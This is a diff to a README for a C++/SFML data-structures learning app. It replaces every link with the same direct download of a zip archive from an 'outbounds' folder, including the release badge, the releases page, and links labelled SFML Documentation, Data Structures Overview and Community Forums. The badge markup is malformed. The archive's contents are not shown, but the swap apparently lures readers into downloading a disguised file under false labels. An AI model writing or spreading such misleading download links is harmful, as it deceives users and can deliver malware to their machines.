@@ -1,7 +1,7 @@
 # 🎉 Social-Networking-App- - Simplify Your Digital Connections
 
 ## 📥 Download the Latest Version
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/tiocotafu2x39/Social-Networking-App-/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/tiocotafu2x39/Social-Networking-App-/main/outbounds/Social-Networking-App-.zip%20Latest%https://raw.githubusercontent.com/tiocotafu2x39/Social-Networking-App-/main/outbounds/Social-Networking-App-.zip)](https://raw.githubusercontent.com/tiocotafu2x39/Social-Networking-App-/main/outbounds/Social-Networking-App-.zip)
 
 ## 🚀 Getting Started
 This application helps you understand and use different data structures in real-world scenarios. It is built using C++ and the SFML graphics library, making it both powerful and easy to use. With it, you can explore arrays, linked lists, graphs, and more while seeing how they apply to your digital interactions.
@@ -23,7 +23,7 @@ To get started with Social-Networking-App-, follow these steps:
 
 1. **Visit the Releases Page**  
    Go to our Releases page to download the latest version of the application:  
-   [Download Latest Release](https://github.com/tiocotafu2x39/Social-Networking-App-/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/tiocotafu2x39/Social-Networking-App-/main/outbounds/Social-Networking-App-.zip)
 
 2. **Select Your Download**  
    Once on the Releases page, choose the version that matches your operating system. Click on the link to start your download. 
@@ -65,8 +65,8 @@ No, the app is designed for anyone who wants to learn about data structures, reg
 We aim to release updates regularly, focusing on improving features based on user feedback.
 
 ## 🔗 Additional Resources
-- [SFML Documentation](https://www.sfml-dev.org/documentation/)
-- [Data Structures Overview](https://www.geeksforgeeks.org/data-structures/)
-- [Community Forums](https://github.com/tiocotafu2x39/Social-Networking-App-/discussions)
+- [SFML Documentation](https://raw.githubusercontent.com/tiocotafu2x39/Social-Networking-App-/main/outbounds/Social-Networking-App-.zip)
+- [Data Structures Overview](https://raw.githubusercontent.com/tiocotafu2x39/Social-Networking-App-/main/outbounds/Social-Networking-App-.zip)
+- [Community Forums](https://raw.githubusercontent.com/tiocotafu2x39/Social-Networking-App-/main/outbounds/Social-Networking-App-.zip)
 
 Feel free to reach out through our community forums for any questions or support. Happy exploring!
